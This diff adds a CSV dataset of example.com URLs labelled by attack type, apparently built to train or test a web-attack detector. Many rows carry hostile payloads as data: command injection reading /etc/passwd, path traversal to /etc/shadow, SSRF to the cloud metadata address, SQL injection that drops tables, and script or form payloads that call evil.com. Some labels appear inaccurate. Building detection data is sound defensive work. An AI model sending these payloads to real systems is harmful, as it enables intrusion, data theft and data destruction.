@@ -1,0 +1,1301 @@
+URL,Attack_Type,Payload_Description
+https://example.com/?q=name%3DJohnDoe,NONE,Safe input
+https://example.com/?redirect=user123,NONE,Safe input
+https://example.com/?input=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?cmd=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?q=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?content=name%3DJohnDoe,NONE,Safe input
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?token=page%3Dhome,NONE,Safe input
+https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?token=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?search=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?url=apple,NONE,Safe input
+https://example.com/?user=feedback,NONE,Safe input
+https://example.com/?q=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?search=query%3Dhelp,NONE,Safe input
+https://example.com/?input=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=apple,NONE,Safe input
+https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?path=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?q=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?input=banana,NONE,Safe input
+https://example.com/?cmd=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?file=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?content=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?input=user123,NONE,Safe input
+https://example.com/?content=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?redirect=logout%3Dtrue,NONE,Safe input
+https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?input=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?q=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?q=about-us,NONE,Safe input
+https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?input=about-us,NONE,Safe input
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=page%3Dhome,NONE,Safe input
+https://example.com/?content=user123,NONE,Safe input
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?token=feedback,NONE,Safe input
+https://example.com/?redirect=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?redirect=logout%3Dtrue,NONE,Safe input
+https://example.com/?q=page%3Dhome,NONE,Safe input
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?search=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?token=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?search=banana,NONE,Safe input
+https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?path=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?cmd=page%3Dhome,NONE,Safe input
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?content=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?input=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?input=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?user=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?search=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?token=page%3Dhome,NONE,Safe input
+https://example.com/?id=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=banana,NONE,Safe input
+https://example.com/?content=search%3Dproducts,NONE,Safe input
+https://example.com/?id=query%3Dhelp,NONE,Safe input
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=user123,NONE,Safe input
+https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?token=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?token=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?data=page%3Dhome,NONE,Safe input
+https://example.com/?user=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?file=category%3Dbooks,NONE,Safe input
+https://example.com/?url=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?redirect=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=filter%3Dpopular,NONE,Safe input
+https://example.com/?content=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?path=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?id=apple,NONE,Safe input
+https://example.com/?path=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?file=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?token=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?redirect=id%3D567,NONE,Safe input
+https://example.com/?user=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=category%3Dbooks,NONE,Safe input
+https://example.com/?file=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?redirect=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=hello,NONE,Safe input
+https://example.com/?id=logout%3Dtrue,NONE,Safe input
+https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?redirect=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?input=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=apple,NONE,Safe input
+https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?token=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?url=logout%3Dtrue,NONE,Safe input
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?data=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=banana,NONE,Safe input
+https://example.com/?content=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=lang%3Den,NONE,Safe input
+https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?cmd=search%3Dproducts,NONE,Safe input
+https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?redirect=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?cmd=category%3Dbooks,NONE,Safe input
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?url=page%3Dhome,NONE,Safe input
+https://example.com/?user=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?redirect=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?file=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=user123,NONE,Safe input
+https://example.com/?content=apple,NONE,Safe input
+https://example.com/?user=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?url=about-us,NONE,Safe input
+https://example.com/?cmd=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?data=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?data=about-us,NONE,Safe input
+https://example.com/?id=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?token=banana,NONE,Safe input
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?cmd=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?input=filter%3Dpopular,NONE,Safe input
+https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?cmd=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=category%3Dbooks,NONE,Safe input
+https://example.com/?path=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=filter%3Dpopular,NONE,Safe input
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?cmd=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?id=category%3Dbooks,NONE,Safe input
+https://example.com/?file=banana,NONE,Safe input
+https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?cmd=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?file=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?content=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=hello,NONE,Safe input
+https://example.com/?search=user123,NONE,Safe input
+https://example.com/?search=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?user=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?search=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?cmd=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?path=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?redirect=feedback,NONE,Safe input
+https://example.com/?q=filter%3Dpopular,NONE,Safe input
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
